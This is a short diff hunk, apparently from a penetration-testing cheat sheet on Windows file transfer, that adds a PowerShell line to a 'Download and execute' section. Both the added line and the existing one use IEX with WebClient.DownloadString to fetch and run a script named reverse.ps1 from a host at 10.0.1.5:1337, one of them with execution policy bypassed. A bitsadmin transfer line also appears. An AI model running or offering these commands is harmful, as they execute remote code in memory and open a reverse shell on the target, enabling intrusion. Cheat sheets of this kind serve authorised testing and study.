@@ -118,6 +118,7 @@ bitsadmin /create JOB & bitsadmin /addfile JOB %TEMP%\test1.txt %TEMP%\test2.txt
     ```
 * Download and execute
     ```powershell
+    IEX(New-Object System.Net.WebClient).DownloadString("https://10.0.1.5:1337/reverse.ps1")
     powershell -Exec Bypass -c "IEX(New-Object System.Net.WebClient).DownloadString(`"""http://10.0.1.5:1337/reverse.ps1`""")"
     ```
 * Uploading files
